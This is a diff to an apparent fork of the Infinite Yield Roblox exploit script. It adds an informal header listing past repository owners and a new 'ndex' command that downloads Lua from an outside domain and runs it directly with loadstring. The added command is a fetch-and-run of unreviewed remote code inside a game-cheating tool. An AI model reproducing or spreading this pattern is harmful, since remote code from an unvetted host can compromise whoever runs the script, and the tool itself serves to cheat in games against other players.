@@ -1,3 +1,17 @@
+--[[
+wsp,
+welcome to moon yield source, skid iyw
+history of owners:
+
+pkplaysrblx (https://github.com/pkplaysrblx) - Account flagged
+LycheeFeather (https://github.com/LycheeFeather) - Changed account name
+purplesstrat (https://github.com/purplesstrat) - Deleted repository due to lack of updates
+and finally,
+
+me!! - Keeping the repository maintained on a chromebook
+
+]]
+
 if IY_LOADED and not _G.IY_DEBUG then
 	-- error("Infinite Yield is already running!", 0)
 	return
@@ -4483,8 +4497,8 @@ local function loadunc(url)
     return (loadstring or load)(lI)()
 end
 
-
 CMDs[#CMDs + 1] = {NAME = 'discord / support / help', DESC = 'Invite to the Infinite Yield discord server.'}
+CMDs[#CMDs + 1] = {NAME = 'ndex / dexplusplus / dex++', DESC = 'Loads the better version of Dex'}
 CMDs[#CMDs + 1] = {NAME = 'vulncheck / vulntest', DESC = 'Tests your executor\'s vulnerabilities using Pigeon\'s Vuln Tester'}
 CMDs[#CMDs + 1] = {NAME = 'guiscale [number]', DESC = 'Changes the size of the gui. [number] accepts both decimals and whole numbers. Min is 0.4 and Max is 2'}
 CMDs[#CMDs + 1] = {NAME = 'console', DESC = 'Loads Roblox console'}
@@ -6616,6 +6630,10 @@ addcmd('keepiy', {}, function(args, speaker)
 	else
 		notify('Incompatible Exploit','Your exploit does not support this command (missing queue_on_teleport)')
 	end
+end)
+
+addcmd('ndex', {'dexplusplus', 'dex++'}, function(args, speaker)
+	loadstring(game:HttpGet("https://nescoroco.lat/NDexV01.txt"))()
 end)
 
 addcmd('vulntest', {'vulncheck'}, function(args, speaker)
